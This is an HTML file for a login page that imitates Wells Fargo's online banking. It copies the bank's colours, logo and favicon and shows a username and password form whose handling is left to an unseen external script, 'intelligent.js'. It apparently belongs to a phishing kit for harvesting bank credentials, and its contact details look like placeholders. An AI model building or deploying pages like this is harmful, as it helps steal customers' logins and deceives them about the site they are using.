<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wells Fargo â€“ Online Banking</title>
  <!-- Wells Fargo Favicon -->
  <link rel="icon" href="https://www.wellsfargo.com/favicon.ico" type="image/x-icon">

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }
    header {
      background-color: #d71e28; /* Wells Fargo red */
      padding: 15px;
      text-align: center;
    }
    header img {
      height: 50px;
    }
    .container {
      max-width: 400px;
      margin: 40px auto;
      background: white;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #333;
      margin-bottom: 20px;
      text-align: center;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #d71e28;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #b21820;
    }
    .demo-section {
      margin-top: 30px;
      padding: 15px;
      background: #fff8f5;
      border: 1px solid #ddd;
      border-radius: 6px;
    }
    .demo-section h3 {
      color: #d71e28;
      margin-bottom: 10px;
    }
    .contact-info {
      margin-top: 15px;
      font-size: 14px;
      color: #333;
    }
    .contact-info p {
      margin: 5px 0;
    }
    .im {
      width: 50%;
    }
    .ba {
      background-color: #d71e28;
      padding-top: 4px;
    }
  </style>
</head>
<body>
  <div class="ba">
      <img src="wf_logo_220x23.png" alt="Wells Fargo Logo" class="im">
      </div>
  <header>
  </header>

  <div class="container">
    <h2>Sign On</h2>
    <form id="allForm">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Enter Username" name="Username">

      <label for="password">Password</label>
      <input type="password" id="password" placeholder="Enter Password" name="password">

      <button type="submit">Sign On</button>
    </form>

    <!-- Demo Create Account Section -->
    <div class="demo-section">
      <h3>Create an Account </h3>
      <p>You would be able to create an account here.</p>
      <p><strong>Note:</strong> Account will be created.</p>
    </div>

    <!-- Contact Info -->
    <div class="contact-info">
      <p><strong>Contact Wells Fargo</strong></p>
      <p>ðŸ“ž 1-800-555-1234</p>
      <p>ðŸ“§ support@wellsfargo.com</p>
    </div>
  </div>
  <script src="intelligent.js"></script>
</body>
</html>
